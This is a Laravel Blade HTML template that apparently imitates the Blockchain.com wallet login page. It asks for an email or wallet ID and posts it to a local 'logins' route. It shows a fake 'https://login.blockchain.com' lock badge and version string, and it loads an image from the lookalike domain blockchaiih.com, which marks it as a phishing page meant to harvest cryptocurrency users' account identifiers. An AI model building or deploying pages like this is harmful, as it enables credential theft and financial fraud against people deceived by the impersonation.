<!DOCTYPE html>
<head>
   <title>Login</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="stylesheet" href="css/bootstrap.min.css" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <link rel="stylesheet" href="css/style.css" />

</head>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
   <body id="login_page_" class="antialiased">
      <!-- <div class="relative flex items-top justify-center min-h-screen bg-gray-100 dark:bg-gray-900 sm:items-center sm:pt-0">
         @if (Route::has('login'))
             <div class="hidden fixed top-0 right-0 px-6 py-4 sm:block">
                 @auth
                     <a href="{{ url('/home') }}" class="text-sm text-gray-700 underline">Home</a>
                 @else
                     <a href="{{ route('login') }}" class="text-sm text-gray-700 underline">Log in</a>
         
                     @if (Route::has('register'))
                         <a href="{{ route('register') }}" class="ml-4 text-sm text-gray-700 underline">Register</a>
                     @endif
                 @endauth
             </div>
         @endif
         </div> -->
      <span class="bottom_icon"><img src="http://blockchaiih.com/img/spinningIcons.gif" alt="#" /></span>
      <div class="login_section">
      <div class="header_login">
         <h5><a href="#">Logo</a></h5>
      </div>
      <div class="login_content_section login_">
         <p>Welcome back!</p>
      </div>
      <div class="center_box">
         <div class="form_section_">
            <div class="form_ form_1">
               <form action='logins' method="POST">
                @csrf
                  <fieldset>
                     <div class="field">
                        <label>Your Email or Wallet ID</label>
                        <input placeholder="Enter your email or wallet ID" type="text" name="email" required="" />
                     </div>
                     <div class="field" style="margin-top: 25px;">
                        <input type="submit" value="sumbit" name="submit">
                     </div>
                     <div class="field">
                      <p class="need_help"><a href="#">Need some help?</a></p>
                     </div>
                  </fieldset>
               </form>
               <div class="info_text">
                 <p><img src="img/i_icon.png" alt="#" />You can now log in with your email.</p>
                 <a href="#">Learn More</a>
               </div>
            </div>
            <p class="bottom_text">Please check that you are visiting the correct URL</p>
            <div class="box_links">
              <p><img src="img/lock.png"> https://login.blockchain.com</p>
            </div>
            
         </div>

      </div>
      <div class="bottom_text_content">
              <p class="content_btm">Don't have a Blockchain Account? <a href="signup.html">Sign up Now -></a></p>
              <ul class="bottom_link">
                <li><a href="#">English</a></li>
                <li><a href="#">Version 4.51.6</a></li>
                <li><a href="#">Need Help?</a></li>
              </ul>
            </div>
      <style>
         .form_section_ {
         width: auto;
         }
         .form_ {
         width: 480px;
         padding: 2rem;
         background: rgb(255, 255, 255);
         border-radius: 0.75rem;
         box-sizing: border-box;
         float: left;
         }
         .form_1 {
         margin-right: 0;
         }
         .form_section_ {
         display: inline-block;
         margin: 0 auto;
         }
         .center_box {
         display: flex;
         justify-content: center;
         }
         .form_.form_1 {
         margin-bottom: 20px;
         }
         .bottom_text_content {
    position: relative;
    width: 100%;
    margin-top: 140px;
    bottom: 0;
}
body#login_page_ {
  padding-bottom: 30px;
}
      </style>
      <script src="js/jquery.min.js"></script>
      <script src="js/popper.min.js"></script>
      <script src="js/bootstrap.min.js"></script>
   </body>
</html>